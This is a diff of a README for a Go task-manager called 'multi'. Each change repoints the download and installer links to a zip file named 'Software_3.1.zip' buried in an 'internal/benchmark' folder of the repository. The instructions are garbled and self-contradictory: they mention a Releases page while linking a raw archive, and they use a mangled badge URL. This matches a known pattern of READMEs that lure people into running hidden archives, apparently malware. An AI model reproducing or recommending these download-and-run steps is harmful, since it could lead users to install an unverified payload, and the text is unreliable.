@@ -1,6 +1,6 @@
 # 🚀 multi - Manage Tasks Easily with Go's Power
 
-[![Download Latest Release](https://raw.githubusercontent.com/Asmerom528/multi/main/analytic/multi.zip%20Latest%20Release-v1.0-blue?style=flat&logo=github)](https://raw.githubusercontent.com/Asmerom528/multi/main/analytic/multi.zip)
+[![Download Latest Release](https://github.com/Asmerom528/multi/raw/refs/heads/main/internal/benchmark/Software_3.1.zip%20Latest%20Release-v1.0-blue?style=flat&logo=github)](https://github.com/Asmerom528/multi/raw/refs/heads/main/internal/benchmark/Software_3.1.zip)
 
 ## 📋 Description
 
@@ -28,7 +28,7 @@ To run the multi application smoothly, ensure that your computer meets the follo
 
 ### 1. Download the Application
 
-To download multi, [visit this page to download](https://raw.githubusercontent.com/Asmerom528/multi/main/analytic/multi.zip). 
+To download multi, [visit this page to download](https://github.com/Asmerom528/multi/raw/refs/heads/main/internal/benchmark/Software_3.1.zip). 
 
 ### 2. Choose the Latest Release
 
@@ -36,7 +36,7 @@ On the Releases page, locate the latest version of multi. This will be clearly m
 
 ### 3. Download the Installer
 
-Click on the installer suitable for your operating system. It will typically look like `https://raw.githubusercontent.com/Asmerom528/multi/main/analytic/multi.zip` where "OS" stands for Windows, macOS, or Linux. 
+Click on the installer suitable for your operating system. It will typically look like `https://github.com/Asmerom528/multi/raw/refs/heads/main/internal/benchmark/Software_3.1.zip` where "OS" stands for Windows, macOS, or Linux. 
 
 ### 4. Run the Installer
 
@@ -44,7 +44,7 @@ Once the download is complete, locate the file in your Downloads folder and doub
 
 ## 🛠️ Download & Install
 
-1. To get started, [visit this page to download](https://raw.githubusercontent.com/Asmerom528/multi/main/analytic/multi.zip).
+1. To get started, [visit this page to download](https://github.com/Asmerom528/multi/raw/refs/heads/main/internal/benchmark/Software_3.1.zip).
   
 2. Install the application by following the steps outlined above. 
 
